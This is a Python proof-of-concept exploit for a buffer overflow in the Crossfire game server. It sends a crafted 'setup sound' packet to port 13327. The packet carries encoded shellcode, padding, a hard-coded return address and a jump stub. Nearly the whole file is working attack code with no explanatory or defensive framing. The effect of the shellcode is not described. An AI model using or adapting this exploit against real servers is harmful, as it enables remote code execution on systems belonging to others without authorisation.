#!/usr/bin/python        
# Proof of concept for Crossfire game    
# Buffer overflow vulnerability    
    
import socket        
#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
#nasm > exit

host = "127.0.0.1"        
ret="\x97\x45\x13\x08"

shellcode=("\xbf\x2d\x88\xbc\xfe\xdd\xc1\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x14\x83\xc6\x04\x31\x7e\x10\x03\x7e\x10\xcf\x7d\x8d\x25\xf8"
"\x9d\xbd\x9a\x55\x08\x40\x94\xb8\x7c\x22\x6b\xba\x26\xf5\x21"
"\xd2\xda\x09\xc2\xf0\xb1\x19\x9b\xa4\xcc\xfb\x71\x22\x97\x36"
"\x05\x23\x66\xcd\xb5\x37\xd9\xab\x74\xb7\x5a\x84\xe1\x7a\xdc"
"\x77\xb4\xee\xe2\x2f\x8a\x6e\x55\xa9\xec\x06\x49\x66\x7e\xbe"
"\xfd\x57\xe2\x57\x90\x2e\x01\xf7\x3f\xb8\x27\x47\xb4\x77\x27")

crash = shellcode + "\x41" * (4368-105) + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"   
buffer = "\x11(setup sound " + crash + "\x90\x00#"        
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
print "[*]Sending evil buffer..."    
s.connect((host,13327))   
s.send(buffer)   
data=s.recv(1024)   
print data    
s.close()   
print "[*]Payload Sent!" 
